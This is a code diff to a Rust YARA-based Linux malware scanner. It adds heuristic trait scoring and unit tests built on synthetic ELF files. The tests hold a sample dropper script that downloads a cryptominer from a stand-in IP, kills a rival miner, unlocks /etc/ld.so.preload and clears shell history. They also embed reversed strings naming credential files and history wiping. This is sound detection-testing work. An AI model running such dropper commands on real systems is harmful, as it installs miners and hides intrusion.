@@ -7,7 +7,11 @@
 //!     exactly (the EICAR test file) rather than by pattern;
 //!   - YARA Forge's `score` (0-100) on feed rules: 90 and up is malicious,
 //!     70 and up suspicious; lower-scored and unscored feed rules are
-//!     ignored, since they are the ones that fire on legitimate files.
+//!     ignored, since they are the ones that fire on legitimate files;
+//!   - `qlam_heur = <points>` on Qlam's heuristic rules (qlam-heuristics.yar):
+//!     not detections but traits. Their points are added up, and a file
+//!     reaching HEUR_THRESHOLD is reported as suspicious, named after its
+//!     traits. A real detection always wins over the sum.
 
 use std::path::{Path, PathBuf};
 use std::sync::LazyLock;
@@ -24,6 +28,16 @@ const SCAN_TIMEOUT: Duration = Duration::from_secs(5);
 
 /// Namespace prefix of the rules shipped with Qlam.
 const BUNDLED_PREFIX: &str = "qlam_";
+
+/// Heuristic points at which a file is reported (as suspicious). Set so it
+/// takes at least two traits: see qlam-heuristics.yar.
+pub const HEUR_THRESHOLD: i64 = 60;
+/// ...and at least one trait this strong among them: weak, text-based
+/// traits never add up to a report on their own.
+pub const HEUR_MIN_STRONG: i64 = 25;
+
+/// Name prefix of heuristic findings.
+pub const HEUR_NAME: &str = "Qlam.Heur.ELF";
 
 pub struct YaraRules {
     rules: Option<Rules>,
@@ -99,6 +113,8 @@ impl YaraRules {
         // too, whatever their conditions say.
         let is_elf = data.starts_with(b"\x7fELF");
         let mut best: Option<Match> = None;
+        let mut heur_points = 0;
+        let mut traits: Vec<(i64, String)> = Vec::new();
         for rule in results.matching_rules() {
             if !rule.namespace().starts_with(BUNDLED_PREFIX) && (!is_elf || is_test_file_rule(rule.identifier())) {
                 continue;
@@ -107,8 +123,12 @@ impl YaraRules {
             let mut confirmed = false;
             let mut score = None;
             let mut name = None;
+            let mut heur = None;
+            let mut trait_text = None;
             for (key, value) in rule.metadata() {
                 match (key, value) {
+                    ("qlam_heur", MetaValue::Integer(i)) => heur = Some(i),
+                    ("qlam_trait", MetaValue::String(s)) => trait_text = Some(s.to_string()),
                     ("qlam_severity", MetaValue::String(s)) => {
                         severity = match s {
                             "malicious" => Some(Severity::Malicious),
@@ -121,6 +141,14 @@ impl YaraRules {
                     ("score", MetaValue::Integer(i)) => score = Some(i),
                     _ => {}
                 }
+            }
+            if let Some(points) = heur {
+                // Only Qlam's own rules may add to the heuristic score.
+                if rule.namespace().starts_with(BUNDLED_PREFIX) {
+                    heur_points += points;
+                    traits.push((points, trait_text.unwrap_or_else(|| rule.identifier().to_string())));
+                }
+                continue;
             }
             let severity = match (severity, score) {
                 (Some(s), _) => s,
@@ -140,6 +168,17 @@ impl YaraRules {
             if better {
                 best = Some(Match { severity, confirmed, name });
             }
+        }
+        let strong = traits.iter().any(|(p, _)| *p >= HEUR_MIN_STRONG);
+        if best.is_none() && heur_points >= HEUR_THRESHOLD && strong {
+            // Strongest traits first: they're what the user reads.
+            traits.sort_by(|a, b| b.0.cmp(&a.0));
+            let list: Vec<String> = traits.into_iter().map(|(_, t)| t).collect();
+            best = Some(Match {
+                severity: Severity::Suspicious,
+                confirmed: false,
+                name: format!("{HEUR_NAME} ({})", list.join("; ")),
+            });
         }
         best
     }
@@ -253,8 +292,8 @@ rule Linux_Hacktool_Socat { condition: elf.type == elf.ET_EXEC }
     }
 
     fn bundled() -> YaraRules {
-        let path = PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/rules/qlam-linux.yar"));
-        YaraRules::load_files(&[(path, true)])
+        let dir = PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/rules"));
+        YaraRules::load_files(&[(dir.join("qlam-linux.yar"), true), (dir.join("qlam-heuristics.yar"), true)])
     }
 
     const DROPPER: &str = "wget http://1.2.3.4/xmrig -O /tmp/.x/k\npkill -9 -f kinsing\nchattr -i /etc/ld.so.preload\nhistory -c\n";
@@ -282,7 +321,8 @@ rule Linux_Hacktool_Socat { condition: elf.type == elf.ET_EXEC }
     }
 
     /// A minimal 64-bit little-endian ELF header of type `e_type` (1 =
-    /// relocatable, i.e. a kernel module), followed by `strings`.
+    /// relocatable, i.e. a kernel module), followed by `strings`, padded to
+    /// 2 KB so it doesn't look like a tiny shellcode loader.
     fn elf(e_type: u8, strings: &[String]) -> Vec<u8> {
         let mut e = vec![0u8; 64];
         e[..4].copy_from_slice(b"\x7fELF");
@@ -295,6 +335,7 @@ rule Linux_Hacktool_Socat { condition: elf.type == elf.ET_EXEC }
             e.push(0);
             e.extend_from_slice(s.as_bytes());
         }
+        e.resize(e.len().max(2048), 0);
         e
     }
 
@@ -368,6 +409,62 @@ rule Linux_Hacktool_Socat { condition: elf.type == elf.ET_EXEC }
         for (what, data) in &clean {
             assert_eq!(name(data), None, "{what} was flagged");
         }
+    }
+
+    /// An ELF with one PT_LOAD program header of `flags` (7 = RWX) and no
+    /// section headers, padded to `size` bytes.
+    fn elf_segment(flags: u8, size: usize, strings: &[String]) -> Vec<u8> {
+        let mut e = elf(2, &[]);
+        e.truncate(64);
+        e[16] = 2;
+        e[32] = 64; // e_phoff
+        e[54] = 56; // e_phentsize
+        e[56] = 1; // e_phnum
+        let mut ph = vec![0u8; 56];
+        ph[0] = 1; // PT_LOAD
+        ph[4] = flags;
+        ph[32..40].copy_from_slice(&(size as u64).to_le_bytes()); // p_filesz
+        ph[40..48].copy_from_slice(&(size as u64).to_le_bytes()); // p_memsz
+        e.extend_from_slice(&ph);
+        for s in strings {
+            e.push(0);
+            e.extend_from_slice(s.as_bytes());
+        }
+        e.resize(size.max(e.len()), 0x90);
+        e
+    }
+
+    #[test]
+    fn heuristics_need_several_traits() {
+        let rules = bundled();
+        let name = |data: &[u8]| rules.scan(data).map(|m| (m.severity, m.name));
+
+        // Tiny, structureless and writable+executable: a shellcode stager.
+        let (sev, n) = name(&elf_segment(7, 400, &[])).expect("stager flagged");
+        assert_eq!(sev, Severity::Suspicious);
+        assert!(n.starts_with(HEUR_NAME) && n.contains("tiny program") && n.contains("writable and executable"), "{n}");
+
+        // A kernel thread's name alone: not enough.
+        let masq = r("]0:0/rekrowk[");
+        assert_eq!(name(&elf(2, &[masq.clone()])), None);
+        // ...with history wiping: reported.
+        let (_, n) = name(&elf(2, &[masq, r("llun/ved/=ELIFTSIH"), r("pmtw/gol/rav/")])).expect("flagged");
+        assert!(n.contains("kernel thread") && n.contains("history"), "{n}");
+
+        // Honest UPX packing, static: normal for some tools.
+        assert_eq!(name(&elf_segment(5, 8000, &[r("XPU eht htiw dekcap si elif sihT :ofnI$")])), None);
+        // A normal (R-X) segment in a real-sized program: nothing.
+        assert_eq!(name(&elf_segment(5, 8000, &[])), None);
+
+        // Weak, text-based traits alone never add up to a report, however
+        // many (a big program embedding scripts has all their strings).
+        let weak = [r("wodahs/cte/"), r("asr_di/hss."), r("exe/fles/corp/"), r("knilnu"), r("dists"),
+                    r("lacol.cr/cte/"), r("/d.tini/cte/"), r("/d.norc/cte/"), r("hs/nib/"), r(" 08:4.3.2.1 ")];
+        assert_eq!(name(&elf(2, &weak)), None);
+
+        // A named detection wins over the heuristic sum.
+        let n = name(&elf(2, &[r("ukarog aw netiaK"), r("]0:0/rekrowk["), r("llun/ved/=ELIFTSIH"), r("pmtw/gol/rav/")])).unwrap().1;
+        assert_eq!(n, "Qlam.Linux.Botnet.Tsunami");
     }
 
     fn source(rel: &str) -> String {
